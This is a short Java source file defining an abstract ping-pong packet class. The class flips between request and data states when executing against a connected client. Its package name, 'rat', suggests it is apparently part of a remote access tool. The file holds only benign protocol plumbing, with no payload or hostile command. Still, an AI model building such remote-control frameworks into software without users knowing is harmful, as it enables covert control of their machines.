package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveClient;

public abstract class AbstractPingPongPacket implements IPacket {
	
	private byte type;
	
	public static final byte REQUEST = 0;
	public static final byte DATA = 1;
	
	public AbstractPingPongPacket() {
		type = REQUEST;
	}
	
	protected abstract void executeRequest(final ActiveClient client);
	
	protected abstract void executeData(final ActiveClient client);
	
	@Override
	public final void execute(final ActiveClient client) {
		if (type == REQUEST) {
			type = DATA;
			
			executeRequest(client);
		} else if (type == DATA) {
			type = REQUEST;
			
			executeData(client);
		}
	}
	
	public final byte getType() {
		return type;
	}
	
}
